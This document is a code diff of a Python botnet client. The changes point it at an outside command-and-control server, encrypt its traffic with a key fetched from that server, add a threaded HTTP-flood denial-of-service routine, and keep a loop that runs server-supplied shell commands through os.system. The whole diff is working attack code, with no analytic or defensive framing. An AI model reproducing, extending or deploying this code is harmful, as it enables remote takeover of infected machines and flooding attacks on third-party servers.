@@ -1,10 +1,22 @@
 # imports
 import base64, time, requests, os
 from os import system, name
+from cryptography.fernet import Fernet
 import json, html, threading, random, sys
 
 # setting the cnc server
-cnc_server = 'http://0.0.0.0:80'
+cnc_server = 'https://fcnc.cloudcant.repl.co'
+
+
+def encode(data, key):
+  f = Fernet(key)
+  token = f.encrypt(data.encode("utf-8"))
+  return (token.decode("utf-8"))
+
+
+def decode(data, key):
+  f = Fernet(key)
+  return ((f.decrypt(data)).decode("utf-8"))
 
 
 # getting bot ip
@@ -29,43 +41,6 @@ def clear():
     _ = system("clear")
 
 
-# encode input with base64
-def b64_encode(input):
-  input_ascii = input.encode("ascii")
-  input_b64_raw = base64.b64encode(input_ascii)
-  input_b64 = input_b64_raw.decode("ascii")
-  return input_b64
-
-
-# decode base64 input
-def b64_decode(string):
-  string_ascii = string.encode("ascii")
-  string_decoded_raw = base64.b64decode(string_ascii)
-  string_decoded = string_decoded_raw.decode("ascii")
-  return string_decoded
-
-
-# reverse input
-def reverse(input):
-  return input[::-1]
-
-
-# full encode
-def encode(string):
-  step1 = b64_encode(string)
-  step2 = reverse(step1)
-  output = b64_encode(step2)
-  return output
-
-
-# full decode
-def decode(string):
-  step4 = b64_decode(string)
-  step5 = reverse(step4)
-  output = b64_decode(step5)
-  return output
-
-
 # gettingn the command from the cnc server
 def getcommand():
   global cnc_server
@@ -76,9 +51,18 @@ def getcommand():
 
 # getting the if toggle
 def getcheck():
-  cnc_check = requests.get(f"{cnc_server}/bot?check")
+  cnc_check = requests.get(f"{cnc_server}/check")
   check = html.unescape(cnc_check.text)
   return check
+
+
+def getkey():
+  response = requests.get(f"{cnc_server}/key")
+  key = html.unescape(response.text)
+  return key
+
+
+fernetkey = getkey().encode("utf-8")
 
 
 # logs
@@ -88,42 +72,132 @@ def log(check):
   clear()
   print(f"""
   {botinfo}
+  ├── {cnc_server}/key
+  │   └── {fernetkey}
+  │       └── Test encryption
+  │           ├── {encode("Hello, World!", fernetkey)}
+  │           └── {decode((encode("Hello, World!", fernetkey)), fernetkey)}
   ├── {cnc_server}/bot
-  │   ├── {encode(command)}
-  │   └── {decode(command)}
-  ├── {cnc_server}/bot?check
-  │   ├── {encode(check)}
-  │   └── {check}
+  │   ├── {command}
+  │   └── {decode(command, fernetkey)}
+  └── {cnc_server}/bot?check
+      ├── {encode(check, fernetkey)}
+      └── {check}
 """)
 
 
 # denial of service example
-def dos(host, reqs, threadc):
+def dos(host2, port, reqs):
   print(f"""
-  {botinfo}
+  ├── {botinfo}
+  │
   ├── DOS
-  │   ├── {host}
-  │   ├── {reqs}
-  │   └── {threadc}
+  │   ├── {host2}
+  │   ├── {port}
+  │   └── {reqs}
 """)
+  import random
+  import socket
+  import string
+  import sys
+  import threading
+  import time
+
+  # Parse inputs
+  ip = host2
+  port = 0
+  num_requests = reqs
+
+  # Convert FQDN to IP
+  try:
+    host = str(host2).replace("https://", "").replace("http://",
+                                                      "").replace("www.", "")
+    ip = socket.gethostbyname(host)
+  except socket.gaierror:
+    print(" ERROR\n Make sure you entered a correct website")
+    pass
+
+  # Create a shared variable for thread counts
+  thread_num = 0
+  thread_num_mutex = threading.Lock()
+
+  # Print thread status
+  def print_status():
+    global thread_num
+    thread_num_mutex.acquire(True)
+
+    thread_num += 1
+    #print the output on the sameline
+    sys.stdout.write(
+      f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#"
+    )
+    sys.stdout.flush()
+    thread_num_mutex.release()
+
+  # Generate URL Path
+  def generate_url_path():
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
+    data = "".join(random.sample(msg, 5))
+    return data
+
+  # Perform the request
+  def attack():
+    print_status()
+    url_path = generate_url_path()
+
+    # Create a raw socket
+    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+      # Open the connection on that raw socket
+      dos.connect((ip, port))
+
+      # Send the request according to HTTP spec
+      #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+      byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+      dos.send(byt)
+    except socket.error:
+      print(f"\n [ No connection, server may be down ]: {str(socket.error)}")
+    finally:
+      # Close our socket gracefully
+      dos.shutdown(socket.SHUT_RDWR)
+      dos.close()
+
+  print(
+    f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}"
+  )
+
+  # Spawn a thread per request
+  all_threads = []
+  for i in range(num_requests):
+    t1 = threading.Thread(target=attack)
+    t1.start()
+    all_threads.append(t1)
+
+    # Adjusting this sleep time will affect requests per second
+    time.sleep(0.01)
+
+  for current_thread in all_threads:
+    current_thread.join()  # Make the main thread wait for the children threads
 
 
 # main process loop
+
 while True:
   # getting if toggled
-  status = decode(getcheck())
+  status = decode(getcheck(), fernetkey)
   # if toggle is set to listen
   if status == 'listen':
     log('Listen')
+    commanddec = decode(getcommand(), fernetkey)
     # checks command type
-    if '*rce*' in decode(command):
-      os.system(str(decode(command).replace('*rce*', '')))
-    elif '*dos*' in decode(command):
-      host, reqs, threads = str(decode(command).replace('*dos*',
-                                                        '')).split('::')
-      dos(host, reqs, threads)
-    elif "*print*" in decode(command):
-      print(str(decode(command).replace('*print*', '')))
+    if '*rce*' in commanddec:
+      os.system(str(commanddec).replace('*rce*', ''))
+    elif '*dos*' in commanddec:
+      host, port, reqs = str(commanddec.replace('*dos*', '')).split('::')
+      dos(host, port, reqs)
+    elif "*print*" in commanddec:
+      print(str(commanddec.replace('*print*', '')))
     # if the command has nothing in it pass
     else:
       pass
